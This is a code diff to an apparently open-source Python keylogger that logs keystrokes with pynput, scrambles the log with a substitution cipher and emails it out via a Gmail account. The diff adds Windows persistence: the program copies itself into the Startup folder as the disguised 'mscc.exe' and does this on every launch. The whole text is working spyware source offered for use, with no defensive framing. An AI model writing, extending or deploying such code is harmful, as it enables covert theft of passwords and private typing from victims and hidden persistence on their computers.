@@ -3,12 +3,14 @@
 # -*- coding: utf-8 -*-
 #Auther: 2021, Mayed Alm
 import os
+import sys
 import random
 import yagmail
 import logging
 import tempfile
 import threading
 from time import sleep
+from shutil import copyfile
 from pynput.keyboard import Listener
 
 
@@ -27,9 +29,14 @@ class PyKLXfilClient_mail:
         logging.basicConfig(filename=self.file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 
-    def persist():
-        #persistence
-        pass
+    def persist(self):
+        #persistence if running as admin in windows
+        if os.name == 'nt':
+            try:
+                print(sys.argv[0])
+                copyfile(sys.argv[0], r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\mscc.exe")
+            except PermissionError:
+                pass
 
     #function to perform basic substitution cipher
     def substitution(self, str):
@@ -66,7 +73,7 @@ class PyKLXfilClient_mail:
         ###Edit with your own gmail account and app password.###
         user = ''
         app_password = ''
-        to = ''
+        to = ''        
         subject = self.hostname_username
         content = [self.log, self.file]     
         with yagmail.SMTP(user, app_password) as yag:
@@ -75,6 +82,7 @@ class PyKLXfilClient_mail:
 
 
     def main_threads(self):
+        self.persist()
         th = threading.Thread(target=self.routine)
         listener = self.Listener(on_press=self.on_press)
         th.daemon = True
